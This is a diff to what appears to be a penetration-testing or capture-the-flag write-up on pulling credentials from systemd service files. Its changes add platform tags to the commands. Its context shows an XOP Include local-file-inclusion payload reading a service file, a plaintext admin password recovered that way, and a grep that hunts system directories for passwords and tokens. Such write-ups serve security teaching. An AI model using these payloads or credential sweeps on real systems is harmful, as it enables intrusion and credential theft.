@@ -14,6 +14,7 @@ Systemd unit files (`.service`) live under `/etc/systemd/system/`, `/lib/systemd
 
 DevArea did not have a shell yet — the service file was pulled through the XOP Include LFI:
 
+<!-- cmd: cross-platform -->
 ```xml
 <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
              href="file:///etc/systemd/system/hoverfly.service"/>
@@ -28,6 +29,7 @@ ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -li
 
 ## From a Shell
 
+<!-- cmd: linux -->
 ```bash
 grep -riE 'password|passwd|token|secret|user' /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null
 ```
